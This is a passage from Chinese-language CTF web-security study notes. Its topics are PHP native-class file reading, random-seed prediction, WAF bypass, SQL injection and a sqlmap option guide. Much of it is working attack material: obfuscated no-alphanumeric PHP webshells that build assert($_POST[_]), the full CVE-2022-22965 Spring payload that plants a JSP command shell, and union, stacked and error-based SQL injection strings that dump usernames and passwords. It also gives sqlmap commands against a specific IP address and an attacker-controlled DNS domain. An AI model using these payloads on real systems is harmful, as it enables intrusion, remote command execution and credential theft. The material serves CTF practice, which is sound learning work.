以f开头的.txt文件，因此我们可以通过 GlobIterator类来模式匹配：  &lt;?php $dir=new GlobIterator(\"f*txt\"); echo $dir;   可读取文件类  -SplFileObject 类 SplFileObject 类和 SplFileinfo为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等  &lt;?php $dir=new SplFileObject(\"/flag.txt\"); echo $dir; ?&gt;  //但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历：   &lt;?php     $dir = new SplFileObject(\"/flag.txt\");     foreach($dir as $tmp){         echo ($tmp.'&lt;br&gt;');     } ?&gt;   最后，形如：  echo new $this-&gt;key($this-&gt;value);   $this -&gt; a = new $this-&gt;key($this-&gt;value); echo $this-&gt;a;   没有pop链的思路和可利用反序列化的函数，一般就是需要用原生类了。  只需要让$this-&gt;key值赋为我们想用原生函数，$this-&gt;value赋为路径，查就行了。但是这种构造类型的方法的局限性就是只能查一个路径上的第一个文件。  phar格式化反序列化  [[SWPUCTF 2021 新生赛]babyunser (ctfer.vip)](https://www.ctfer.vip/problem/466)==&gt;SWPU-babyunser  随机数预测  [[GWCTF 2019]枯燥的抽奖](https://blog.csdn.net/qq_43801002/article/details/107760064)  php提供生成随机数的函数mt_scrand(seed)，而生成的伪随机数是线性的，我们可以通过生成的随机数反推种子，进而获得想要的内容。  WAF绕过  垃圾数据法  1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;flag=php://filter/convert.base64-encode/resource=flag.php   WebShell  无字母数字RCE                 [一些不包含数字和字母的webshell       离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)           根本来看，无字母数字RCE就是利用php动态执行的特点拼凑payload  1.  &lt;?php $_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert'; $__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST'; $___=$$__; $_($___[_]); // assert($_POST[_]);   2.  &lt;?php $__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;'); $_=$__/$__;  $____=''; $___=\"瞰\";$____.=~($___{$_});$___=\"和\";$____.=~($___{$__});$___=\"和\";$____.=~($___{$__});$___=\"的\";$____.=~($___{$_});$___=\"半\";$____.=~($___{$_});$___=\"始\";$____.=~($___{$__});  $_____='_';$___=\"俯\";$_____.=~($___{$__});$___=\"瞰\";$_____.=~($___{$__});$___=\"次\";$_____.=~($___{$_});$___=\"站\";$_____.=~($___{$_});  $_=$$_____; $____($_[$__]);   3.利用php对字符串自增操作的特性  PHP: 递增／递减运算符 - Manual  &lt;?php $_=[]; $_=@\"$_\"; // $_='Array（二）asp  （三）java  Spring框架  我们可以认为Spring是一个超级粘合平台，除了自己提供功能外，还提供粘合其他技术和框架的能力，从而使我们可以更自由的选择到底使用什么技术进行开发。  Spring除了不能帮我们写业务逻辑，却能帮助我们简化开发，有以下几点：     Spring能帮我们根据配置文件创建及组装对象之间的依赖关系。   Spring面向切面编程能帮助我们无耦合的实现日志记录，性能统计，安全控制。   Spring能非常简单的帮我们管理数据库事务。   Spring还提供了与第三方数据访问框架（如Hibernate、JPA）无缝集成，而且自己也提供了一套JDBC访问模板，来方便数据库访问。   Spring还提供与第三方Web（如Struts、JSF）框架无缝集成，而且自己也提供了一套Spring MVC框架，来方便web层搭建。   Spring能方便的与Java EE（如Java Mail、任务调度）整合，与更多技术整合（比如缓存框架）。   有几个概念需要了解：  应用程序：是能完成我们所需要功能的成品，比如购物网站、OA系统、ERP系统。  框架：是能完成一定功能的半成品，比如我们可以使用框架进行购物网站开发；框架做一部分功能，我们自己做一部分功能，这样应用程序就创建出来了。而且框架规定了你在开发应用程序时的整体架构，提供了一些基础功能，还规定了类和对象的如何创建、如何协作等，从而简化我们开发，让我们专注于业务逻辑开发。  非侵入式设计：从框架角度可以这样理解，无需继承框架提供的类，这种设计就可以看作是非侵入式设计，如果继承了这些框架类，就是侵入设计，如果以后想更换框架之前写过的代码几乎无法重用，如果非侵入式设计则之前写过的代码仍然可以继续使用。  轻量级&amp;重量级：轻量级是相对于重量级而言的，轻量级一般就是非入侵性的、所依赖的东西非常少、资源占用非常少、部署简单等等，其实就是比较容易使用，而重量级正好相反。  POJO：POJO（Plain Old Java Objects）简单的Java对象，它可以包含业务逻辑或持久化逻辑，但不担当任何特殊角色且不继承或不实现任何其它Java框架的类或接口。  容器：在日常生活中容器就是一种盛放东西的器具，从程序设计角度看就是装对象的的对象，因为存在放入、拿出等操作，所以容器还要管理对象的生命周期。  控制反转：即Inversion of Control，缩写为IoC，控制反转还有一个名字叫做依赖注入（Dependency Injection），就是由容器控制程序之间的关系，而非传统实现中，由程序代码直接操控。  Bean：一般指容器管理对象，在Spring中指Spring IoC容器管理对象。  Spring框架漏洞          CVE-2022-22965      2022年3月29日，Spring框架曝出RCE 0day漏洞。已经证实由于 SerializationUtils#deserialize 基于 Java 的序列化机制，可导致远程代码执行 (RCE)，使用JDK9及以上版本皆有可能受到影响。Springmvc框架参数绑定功能，绑定了请求里的参数造成变量注入，攻击者可以实现任意文件写入，漏洞点spring-beans包中。  payload:  class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=      suffix: %&gt;// c1: Runtime c2: &lt;% DNT: 1  class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=   原理：  CVE-2022-22965：Spring core RCE漏洞  Spring Core rce漏洞分析(CVE-2022-22965)  Apache Struts2  Struts2 S2-061 远程命令执行漏洞（CVE-2020-17530）  S2-062 远程命令执行漏洞复现（cve-2021-31805）  （四）python  【一文掌握CTF中Python全部考点 】  【以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用】  python序列化对象和反序列化  python提供了两个模块pickle和json，可以使用它们对对象进行序列化。  #dumps将对象序列化为字节数据  &gt;&gt;&gt; import pickle &gt;&gt;&gt; ls = [1,2,3] &gt;&gt;&gt; data = pickle.dumps(ls) &gt;&gt;&gt; data b'\\x80\\x04\\x95\\x0b\\x00\\x00\\x00\\x00\\x00\\x00\\x00]\\x94(K\\x01K\\x02K\\x03e.' &gt;&gt;&gt; f=open(\"a.txt\",mode=\"wb\") &gt;&gt;&gt; f.write(data) 22 &gt;&gt;&gt; f.close()   &gt;&gt;&gt; f=open(\"a.txt\",mode=\"rb\") &gt;&gt;&gt; f.read() b'\\x80\\x04\\x95\\x0b\\x00\\x00\\x00\\x00\\x00\\x00\\x00]\\x94(K\\x01K\\x02K\\x03e.' &gt;&gt;&gt; f.close() #dump将对象序列化为字节数据并且保存到file文件中 &gt;&gt;&gt; ls=[2,3,4] &gt;&gt;&gt; pickle.dump(ls,open(\"a.txt\",mode=\"wb\")) &gt;&gt;&gt; f=open(\"a.txt\",mode=\"rb\") &gt;&gt;&gt; f.read() b'\\x80\\x04\\x95\\x0b\\x00\\x00\\x00\\x00\\x00\\x00\\x00]\\x94(K\\x02K\\x03K\\x04e.'   #loads将字节数据反序列化为对象 &gt;&gt;&gt; f =open(\"a.txt\",\"rb\") &gt;&gt;&gt; show = f.read() &gt;&gt;&gt; show b'\\x80\\x04\\x95\\x0f\\x00\\x00\\x00\\x00\\x00\\x00\\x00]\\x94(K\\x01K\\x02K\\x03K\\x04K\\x05e.' &gt;&gt;&gt; show=pickle.loads(show) &gt;&gt;&gt; show [1, 2, 3, 4, 5] &gt;&gt;&gt; f.close() #load将file中的字节数据反序列化为对象 &gt;&gt;&gt; pickle.load(open(\"a.txt\",\"rb\")) [1, 2, 3, 4, 5]     #dumps方法 &gt;&gt;&gt; import json &gt;&gt;&gt; d={\"usename\":\"zhangsan\",\"age\":17} &gt;&gt;&gt; json.dumps(d) '{\"usename\": \"zhangsan\", \"age\": 17}' &gt;&gt;&gt; s=json.dumps(d) &gt;&gt;&gt; f=open(\"a.txt\",\"wt\") &gt;&gt;&gt; f.write(s) 34 &gt;&gt;&gt; f.close()   #loads方法 &gt;&gt;&gt; f=open(\"a.txt\",\"rt\") &gt;&gt;&gt; ss = f.read() &gt;&gt;&gt; ss '{\"usename\": \"zhangsan\", \"age\": 17}' &gt;&gt;&gt; json.loads(ss) {'usename': 'zhangsan', 'age': 17} &gt;&gt;&gt; dd = json.loads(ss) &gt;&gt;&gt; dd {'usename': 'zhangsan', 'age': 17} &gt;&gt;&gt; f.close()   五、数据库绕过与利用  （一）SQL语句与注入  SQL注入WIKI (radare.cn)  SQL注入(巨详解) - 美式加糖 - 博客园 (cnblogs.com)  sql注入详解_山山而川’的博客-CSDN博客_sql注入  常见的爆库操作  order by试出有几列  暴露数据库名称  id = -1' union select 1,database,3 --+   暴露表名称(查询该数据库下所有表)  id = -1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&lt;数据库名&gt; --+   暴露字段名(查询该表下所有字段)  id = -1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&lt;数据库名&gt; and table_name=&lt;表名&gt; --+ id = -1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='test_tb'--+   查数据  id=-1' union select 1,group_concat(username,0x5c,password),3 from security.users --+ id = -1' union select 1,2,group_concat(id,flag) from test_tb--+  id = -1' union select 1,2,group_concat(&lt;字段1&gt;,&lt;字段2&gt;) from &lt;表&gt;--+    堆叠注入  本质就是多个命令一起注入，用分号隔开。  万用密码：ffifdyop  ffifdyop 经过md5加密后：276f722736c95d99e921722cf9ed621c 再转换为字符串：’or’6  即  'or'66�]��!r,��b  用途： select * from admin where password=’‘or’6' 就相当于select * from admin where password=''or 1  实现sql注入  mid(,,[长度])  这个可以用来查看完整的flag  select columns from `&lt;表名&gt; `  反引号`不能省略     关于在这里使用 ` 而不是 ’ 的一些解释： 两者在linux下和windows下不同，linux下不区分，windows下区分。 单引号 ’ 或双引号主要用于 字符串的引用符号 反勾号 ` 数据库、表、索引、列和别名用的是引用符是反勾号 (注：Esc下面的键) 有MYSQL保留字作为字段的，必须加上反引号来区分！！！ 如果是数值，请不要使用引号。   concat拼接  prepare  因为select被过滤了，所以先将select * from ` 1919810931114514 `进行16进制编码  再通过构造payload得  ;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#  进而得到flag prepare…from…是预处理语句，会进行编码转换。  execute用来执行由SQLPrepare创建的SQL语句。  SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。  原文链接：https://blog.csdn.net/qq_44657899/article/details/103239145  SQL字符替换  1．只过滤了空格 除了空格，在代码中可以代替的空白符还有%0a、%0b、%0c、%0d、%09、%a0（均为URL编码，%a0在特定字符集才能利用）和/**/组合、括号等。 在MySQL中，关键字是不区分大小写的，如果只匹配了”SELECT”，便能用大小写混写的方式轻易绕过，如”sEleCT”。  2．正则匹配 正则匹配关键字”\\bselect\\b”可以用形如”/！50000select/”的方式绕过  SQL报错注入  BigInt数据类型溢出：  exp(int)函数返回e的x次方，当x的值足够大的时候就会导致函数的结果数据类型溢出，也就会因此报错：”DOUBLE value is out of range”  例：  ?id=1” and exp(~(select * from (select user())a)) –+ 先查询select user()这个语句的结果，然后将查询出来的数据作为一个结果集取名为a  然后在查询select * from a 查询a，将结果集a全部查询出来  查询完成，语句成功执行，返回值为0，再取反(~按位取反运算符)，exp调用的时候e的那个数的次方，就会造成BigInt大数据类型溢出，就会报错  payload：  获取表名：  ?id=1\" and exp(~(select * from (select table_name from information_schema.tables where table_schema=database() limit 0,1)a)) --+ //获取列名：  ?id=1\" and exp(~(select * from (select column_name from information_schema.columns where table_name='users' limit 0,1)a)) --+ //获取列名对应信息：  ?id=1\" and exp(~(select * from(select username from 'users' limit 0,1))) --+   适用mysql数据库版本是：5.5.5~5.5.49  除了exp()函数之外，pow()之类的相似函数同样可以利用BigInt数据溢出的方式进行报错注入  函数参数格式错误：  两个重要函数：updatexml（） extractvalue ()  我们就需要构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数，mysql就会报错  updatexml()函数语法：updatexml(XML_document,Xpath_string,new_value)  XML_document:是字符串String格式，为XML文档对象名称  Xpath_string:Xpath格式的字符串  new_value:string格式，替换查找到的符合条件的数据  查询当前数据库的用户信息以及数据库版本信息:  ?id=1\" and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) --+   获取当前数据库下数据表信息：  ?id=1\" and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+   获取users表名的列名信息：  ?id=1\" and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e),3) --+   获取users数据表下username、password两列名的用户字段信息:  ?id=1\" and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) --+  ?id=1\" and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) --+   extractvalue()函数语法:extractvalue(XML_document,XPath_string)  获取当前是数据库名称及使用mysql数据库的版本信息：  ?id=1\" and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) --+   获取当前位置所用数据库的位置：  ?id=1\" and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+   获取表名：  ?id=1\" and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+   获取users表的列名：  ?id=1\" and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e)) --+   获取对应的列名的信息(username/password):  ?id=1\" and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+   常见函数  concat_();  concat ()方法用于连接两个或多个数组。 该方法不会改变现有的数组，而仅仅会返回被连接数组的一个副本。 返回一个新的数组。该数组是通过把所有 arrayX 参数添加到 arrayObject 中生成的。如果要进行 concat 操作的参数是数组，那么添加的是数组中的元素，而不是数组。  sqlmap  快速上手开始使用：  sqlmap -u http://xxx.xxx.xxx 查询是否可以注入 sqlmap -u http://xxx.xxx.xxx --dbs 查询数据库 sqlmap -u http://xxx.xxx.xxx -D &lt;DatabaseName&gt; --tables 查询表 sqlmap -u http://xxx.xxx.xxx -D &lt;DatabaseName&gt; -T &lt;TableName&gt; --columns 查询列 sqlmap -u http://xxx.xxx.xxx -D &lt;DatabaseName&gt; -T &lt;TableName&gt; -C &lt;ColumnName&gt; --dump 读取字段   一.介绍     开源的SQL注入漏洞检测的工具，能够检测动态页面中的get/post参数，cookie，http头，还能够查看数据，文件系统访问，甚至能够操作系统命令执行。   检测方式：布尔盲注、时间盲注、报错注入、UNION联合查询注入、堆叠注入   支持数据库：Mysql、Oracle、PostgreSQL、MSSQL、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDb   二.基本参数  —update： 更新     python sqlmap.py —update   -h：查看常用参数     python sqlmap.py -h   -hh：查看全部参数     python sqlmap.py -h   —version：查看版本     python sqlmap.py —version   -v：查看执行过程信息，默认是1，一共 0 ~ 6     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ -v 3   -d ： mysql表示数据库类型、user:password表示目标服务器的账号和密码，@后表示要连接的服务器，3306表示端口，zakq_ dababasename表示连接的数据库名称     python sqlmap.py -d “mysql://root:root@192.168.126.128:3386/zkaq_databasename”   —wizard ： 向导式     python sqlmap.py —wizard   三.确定目标  -u “URL” ： 指定URL，get请求方式     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“   -m url.txt :：使用一个包含多个url的文件进行扫描。若有重复，sqlmap会自动识别成一个。     python sqlmap.py -m url.txt   -g ：扫描，使用Google语法得到的url。     python sqlmap.py -g “inurl:\\”.php?id=1\\”   -r request.txt ： Post提交方式，使用HTTP请求文件，该文件可从BurpSuit中导出。（BurpSuit抓包—&gt;将请求复制到txt中即可）     python sqlmap.py -r request.txt   -l log.txt —scope=”正则表达式”  ：Post提交方式，使用BurpSuit的log文件。（Options—&gt;Misc—&gt;Logging—&gt;Proxy—&gt;勾选Request ，scope的作用是 基于正则表达式去过滤日志内容，筛选需要扫描的对象。                          python sqlmap.py -l log.txt —scope=”(www)?.target.(com         net         arg)”                  -c sqlmap.conf ：使用配置文件进行扫描 (sqlmap.conf与sqlmap.py 在同一目录)     python sqlmap.py -c sqlmap.conf   -u “URL” ： 对于这种写法，加*号扫描     python sqlmap.py -u “[http://target_url/param1/value1/param2/value2](https://link.zhihu.com/?target=http%3A//target_url/param1/value1/param2/value2)“   四.配置目标参数  -p ：指定要扫描的参数     python sqlmap.py -u “http://59.63.200.79:8003/?id=1&amp;username=admin&amp;password=123“ -p “username,id”   —skip： 排除指定的扫描参数     python sqlmap.py -u “http://59.63.200.79:8003/?id=1&amp;username=admin&amp;password=123“ —skip “username,id”   —data： 指定扫描的参数，get/post都适用     python sqlmap.py -u “http://59.63.200.79:8003/?id=1&amp;username=admin&amp;password=123“ —date=”username=admin&amp;password=123”   —param-del：改变分隔符，默认是&amp;，因为有些网站不实用&amp;传递多个数据。     python sqlmap.py -u “http://59.63.200.79:8003/?id=1&amp;username=admin&amp;password=123“ —date=”username=admin;password=123” —param-del=”;”   —cookie ：使用cookie的身份认证     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —cookie=”security=low;PHPSESSID=121123131”   —drop-set-cookie： 有时候发起请求后，服务器端会重新Set-cookie给客户端，SQLmap默认会使用新的cookie，这时候可以设置此参数，表示还是用原来的cookie。     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —cookie=”security=low;PHPSESSID=121123131 —-drop-set-cookie”   —user-agent ：使用浏览器代理头     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —user-agent=”aaaaaaaaa”   —random-agent： 使用随机的浏览器代理头     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —random-agent   —host ：指定主机头     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —host=”aaaaa”   —referer=”aaaaaa” ： 指定referer头     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —referer=”aaaaaa”   —headers ：有些网站需要特定的头来身份验证     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —headers=”host:aaaa\\nUser-Agent:bbbb”   —method ：指定请求方式，还有POST     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —method=GET   —auth-type ， —auth-cred： 身份认证，还有Digest、NTLM     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —auth-type Basic —auth-cred “user:pass”   —auth-file=”ca.PEM” ： 使用私钥证书去进行身份认证，还有个参数—auth-cert，暂时不知道怎么用，没遇到过  —proxy ：使用代理去扫描目标，代理软件占用的端口在8080     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —proxy=”http://127.0.0.1:8080/“   —proxy-cred：使用代理时的账号和密码     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —proxy=”http://127.0.0.1:8080/“ —proxy-cred=”name:pass”   —ignore-proxy ： 忽略系统级代理设置，通常用于扫描本地网络目标，本网段。     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —ignore-proxy   五.配置目标行为  —force-ssl：使用HTTPS连接进行扫描     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —force-ssl   —delay：每次http请求之间的延迟时间，默认无延迟     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —delay=”3”   —timeout：请求超时时间，浮点数，默认为30秒     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —timeout=”10”   —retries：http连接的重试次数，默认3次     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —retries=”1”   —randomize：长度、类型与原始值保持一致的情况下,随机参数的取值。比如id=100 -&gt; id=1??     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —randomize=”id”   —safe-url：检测盲注阶段时，sqlmap会发送大量失败请求，可能导致服务器端销毁session     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —safe-url=”URL”   —safe-freq ： 每发送多少次注入请求后，发送一次正常请求，配合—safe-url使用。     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —safe-freq   —time-sec： 基于时间的注入检测相应延迟时间，默认5秒     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —time-sec=”3”   —union-cols ：默认联合查询1-10列，随—level增加，最多支持100列。     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —union-cols 6-9   —union-char：联合查询默认使用null，极端情况下可能失败，此时可以手动执行数值     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —union-char 123   —technique US ： 指定检测注入时所用技术，默认情况下Sqlmap会使用自己支持的全部技术进行检测，有B、E、U、S、T、Q     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —technique US   六.优化探测过程  —level 2：检测cookie中是否含有注入、3：检测user-agent、referer是否含有注入、5：检测host是否含有注入     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —level 3   —risk 默认1，最高4，等级高容易造成数据被篡改风险     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —risk 3   —predict-output ： 优化检测方法，不断比对大数据，缩小检测范围，提高效率，与—threads参数不兼容     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —predict-output   —keep-alive ： 长连接、性能好，避免重复建立的网络开销，但大量长连接会占用服务器资源。与—proxy参数不兼容     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —keep-alive   —null-connection ： 只获取页面大小的值，通常用于盲注判断真假，与—text-only 不兼容     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —null-connection   -o ： 直接开启以上三个(—predict-output、—keep-alive、—null-connection)     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ -o   —threads=7 ：提高并发线程，默认为1，建议不要超过10，否则影响站点可用性，与—predict-out不兼容     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —threads=7   —string=”woaini” ： 页面比较，用于基于布尔注入的检测，因为有时候页面随时间阈值变化，此时需要人为指定标识真假的字符串  除此之外，还有—not-string=”woaini”、—code=200、—titles=”Welcome”等等     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —string=”woaini”   七.特定目标环境  —skip-urlencode ：默认get传参会使用URL编码，但有些服务器没按规范，使用原始字符提交数据。     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —skip-urlencode   —eval ：在提交前，对参数进行pyhton的处理，提升效率     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —eval=”import hashlib;hash=hashlib.md5(id).hexdigest()”   —dbms ： 指定数据库类型，还可以加上版本 Mysql&lt;5.0&gt;     python sqlmap.py -u “http://59.63.200.79:8003/?id=1” —dbms=”Mysql”   —os ： 指定操作系统，还可以是Linux     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —os=”Windows”   —invalid-bignum ：sqlmap默认使用负值让参数进行失效，该参数使用最大值让参数失效，比如 id=9999999     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —invalid-bignum   —invalid-logical ：使用布尔值，比如 id 13 and 18=19     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —invalid-logical   —no-cast： 将sqlmap取出的数据转换为字符串，并用空格替换NULL结果，在老版本时需要开启此开关。     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —no-cast   —no-escape：为了逃逸服务器端对sqlmap的检测，默认使用char()编码替换字符串。本参数将关闭此功能。比如 select ‘foo’ —&gt; select cahr(102) + char(111) + char(111)     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —no-escape   —prefix：添加前缀     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —prefix “‘)’”   —suffix ：添加后缀     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —suffix “AND (‘abc’=’abc”   —tamper：使用脚本，绕过IPS、WAF等     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —tamper=”tamper/between.py,tamper/randomcase.py”   —dns-domain：攻击者控制了DNS服务器，可以提高取出数据的效率     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —dns-domain attacker.com   —second-order：在一个页面注入的结果，从另外一个页面提现出来     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —second-order “http://1.1.1.1/b.php“   八.查看基本信息  -f ：扫描时加入数据库指纹检测     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ -f   -b ： 查看数据库的版本信息     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ -b   九.查看数据信息  —users ： 查询所有的数据库账号     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —users   —dbs ： 查询所有数据库     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —dbs   —schema ： 查询源数据库（包含定义数据的数据）     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —schema   -a ： 查询当前user、当前数据库、主机名、当前user是否是最大权限管理员、数据库账号等     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ -a   -D dvwa： 指定数据库     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ -D database_name   —current-user ： 查询当前数据库用户     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —current-user   —current-db ： 查询当前数据库     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —current-db   —hostname ： 查看服务器的主机名     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —hostname   —Privileges -U username ： 查询username的权限     python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —Privileges -U username   —roles 